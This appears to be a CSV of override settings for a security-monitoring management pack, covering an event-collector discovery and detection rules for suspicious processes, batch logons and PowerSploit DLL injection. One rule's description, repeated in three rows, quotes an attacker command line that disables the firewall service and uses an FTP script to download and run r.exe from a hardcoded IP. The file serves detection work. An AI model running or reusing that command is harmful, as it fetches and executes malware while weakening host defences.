ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,Enabled,bool,TRUE,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,IntervalSeconds,int,86400,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,TimeoutSeconds,int,60,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,SyncTime,string,,,,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.BatchLogon,Rule,Security Monitoring Collection:  Event ID 4624 Logon Type 4,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.BatchLogon,Rule,Security Monitoring Collection:  Event ID 4624 Logon Type 4,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Enabled,bool,TRUE,TRUE,TRUE,
